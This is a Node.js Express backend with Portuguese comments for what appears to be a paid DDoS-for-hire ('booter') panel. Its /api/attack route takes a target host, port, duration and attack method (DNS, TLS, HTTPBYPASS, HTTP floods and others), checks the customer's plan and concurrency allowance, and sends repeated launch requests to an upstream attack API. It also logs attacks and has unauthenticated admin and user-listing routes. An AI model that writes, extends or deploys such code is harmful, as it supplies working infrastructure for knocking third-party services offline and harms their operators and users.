const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');
const db = require('./database');
const { addUser, getUsers, updateUser, getUserById, getUserByUsernameAndPassword } = require('./repository');

const app = express();
const port = 3001;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Chave e URL da API do VAC
const vacApiKey = '.';
const vacApiURL = '.';

// Mapeamento dos métodos entre as duas APIs
const methodMapping = {
    'DNS': { vacMethod: ["DNS"] },
    'TLS': { vacMethod: ["TLS"] },
    'HTTPBYPASS': { vacMethod: ["HTTPBYPASS"] },
    'TCPMB': { vacMethod: ["TCPMB"] },
    'SITETLS': { vacMethod: ["TLS"] },
    'SITEBROWSER': { vacMethod: ["BROWSER"] },
    'SITEBEACH': { vacMethod: ["HTTPBEACH"] },
    'HTTP1': { vacMethod: ["HTTP1"] },
    'HTTP2': { vacMethod: ["HTTP2"] },
};

// Rota para receber solicitações de ataque
app.get('/api/attack', async (req, res) => {
    const { host, port, time, method, userId, concurrents } = req.query;

    if (!host || !port || !time || !method || !userId || !concurrents) {
        return res.status(400).json({ error: 'Por favor, forneça todos os parâmetros necessários: host, port, time, method, userId, concurrents' });
    }

    const user = getUserById(userId);
    if (!user) {
        return res.status(404).json({ error: 'Usuário não encontrado' });
    }
    if (user.plan === 'none') {
        return res.status(403).json({ error: 'Você não possui um plano ativo.' });
    }
    if (new Date(user.expiry_date) < new Date()) {
        return res.status(403).json({ error: 'Seu plano expirou.' });
    }
    if (concurrents > user.concurrents) {
        return res.status(403).json({ error: 'Você não tem permissões concorrentes suficientes.' });
    }

    // Verifica se o método existe no mapeamento
    if (!methodMapping[method]) {
        return res.status(400).json({ error: 'Método inválido' });
    }

    try {
        const { vacMethod } = methodMapping[method];

        // Array para armazenar as respostas da VAC
        const vacResponses = [];

        // Envia múltiplas solicitações de acordo com o valor de concorrents
        for (let i = 0; i < concurrents; i++) {
            for (const vacMethodItem of vacMethod) {
                const vacResponse = await axios.get(`${vacApiURL}?key=${vacApiKey}&host=${host}&port=${port}&time=${time}&method=${vacMethodItem}`);
                vacResponses.push(vacResponse.data);
            }
        }

        // Armazenar detalhes do ataque no banco de dados
        const stmt = db.prepare('INSERT INTO attacks (host, port, time, method, response, created_at) VALUES (?, ?, ?, ?, ?, ?)');
        stmt.run(host, port, time, method, JSON.stringify(vacResponses), new Date().toISOString());

        res.json({ vacResponses: vacResponses });
    } catch (error) {
        console.error('Ocorreu um erro:', error);
        res.status(500).json({ error: 'Ocorreu um erro ao processar a solicitação' });
    }
});

// Rota para registrar novos usuários
app.post('/api/register', (req, res) => {
    const { username, email, password } = req.body;

    if (!username || !email || !password) {
        return res.status(400).json({ error: 'Por favor, forneça todos os parâmetros necessários: username, email, password' });
    }

    try {
        addUser(username, email, password);
        res.status(201).json({ message: 'Usuário registrado com sucesso!' });
    } catch (error) {
        console.error('Ocorreu um erro:', error);
        res.status(500).json({ error: 'Ocorreu um erro ao registrar o usuário' });
    }
});

// Rota para login de usuários
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ error: 'Por favor, forneça todos os parâmetros necessários: username e password' });
    }

    try {
        const user = getUserByUsernameAndPassword(username, password);

        if (user) {
            res.status(200).json({ message: 'Login bem-sucedido!', user });
        } else {
            res.status(401).json({ error: 'Usuário ou senha inválidos' });
        }
    } catch (error) {
        console.error('Ocorreu um erro:', error);
        res.status(500).json({ error: 'Ocorreu um erro ao processar a solicitação' });
    }
});

// Rota para obter informações do usuário logado
app.get('/api/user/:id', (req, res) => {
    const userId = req.params.id;

    try {
        const user = getUserById(userId);

        if (user) {
            res.status(200).json(user);
        } else {
            res.status(404).json({ error: 'Usuário não encontrado' });
        }
    } catch (error) {
        console.error('Ocorreu um erro:', error);
        res.status(500).json({ error: 'Ocorreu um erro ao processar a solicitação' });
    }
});

// Rota para obter todos os usuários (para a tela de administração)
app.get('/api/users', (req, res) => {
    try {
        const users = getUsers();
        res.status(200).json(users);
    } catch (error) {
        console.error('Ocorreu um erro:', error);
        res.status(500).json({ error: 'Ocorreu um erro ao processar a solicitação' });
    }
});

// Rota para atualizar informações do usuário
app.post('/api/admin/updateUser', (req, res) => {
    const { id, plan, concurrents, expiry_date } = req.body;

    if (!id || !plan || !concurrents || !expiry_date) {
        return res.status(400).json({ error: 'Por favor, forneça todos os parâmetros necessários: id, plan, concurrents, expiry_date' });
    }

    try {
        updateUser(id, plan, concurrents, expiry_date);
        res.status(200).json({ message: 'Usuário atualizado com sucesso!' });
    } catch (error) {
        console.error('Ocorreu um erro:', error);
        res.status(500).json({ error: 'Ocorreu um erro ao atualizar o usuário' });
    }
});

// Servir o index.html para a rota raiz
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Rota para recuperar ataques armazenados
app.get('/api/attacks', (req, res) => {
    const stmt = db.prepare('SELECT * FROM attacks');
    const attacks = stmt.all();
    res.json(attacks);
});

app.listen(port, () => {
    console.log(`Servidor rodando em http://localhost:${port}`);
});
